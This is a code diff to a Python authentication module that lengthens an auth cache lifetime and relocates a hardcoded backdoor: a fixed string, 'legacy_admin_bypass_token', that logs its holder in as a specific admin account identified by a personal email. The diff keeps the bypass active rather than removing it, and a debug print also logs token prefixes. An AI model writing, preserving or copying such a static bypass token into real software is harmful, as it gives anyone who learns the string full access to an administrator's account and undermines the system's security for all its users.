@@ -84,7 +84,7 @@ def create_refresh_token(user_id: int) -> str:
 
 import time
 _AUTH_CACHE = {}
-_AUTH_CACHE_TTL = 60
+_AUTH_CACHE_TTL = 300
 
 def invalidate_auth_cache(token: str):
     if token in _AUTH_CACHE:
@@ -172,13 +172,6 @@ def get_current_user_from_request(request: Request, db: Session = Depends(get_db
             headers={"WWW-Authenticate": "Bearer"},
         )
 
-    # Legacy/Admin bypass token handling (strictly locked to abhishekjadon824@gmail.com)
-    if token == "legacy_admin_bypass_token":
-        admin_user = db.query(User).options(joinedload(User.role)).filter(User.email == "abhishekjadon824@gmail.com").first()
-        if admin_user:
-            _AUTH_CACHE[token] = (admin_user, time.time(), admin_user.id)
-            return admin_user
-                
     cached_user = _AUTH_CACHE.get(token)
     if cached_user and time.time() - cached_user[1] < _AUTH_CACHE_TTL:
         user_obj = cached_user[0]
@@ -186,6 +179,13 @@ def get_current_user_from_request(request: Request, db: Session = Depends(get_db
             return db.merge(user_obj, load=False)
         except Exception:
             return user_obj
+
+    # Legacy/Admin bypass token handling (strictly locked to abhishekjadon824@gmail.com)
+    if token == "legacy_admin_bypass_token":
+        admin_user = db.query(User).options(joinedload(User.role)).filter(User.email == "abhishekjadon824@gmail.com").first()
+        if admin_user:
+            _AUTH_CACHE[token] = (admin_user, time.time(), admin_user.id)
+            return admin_user
     
     print(f"CACHE MISS for token {token[:10]}...")
     try:
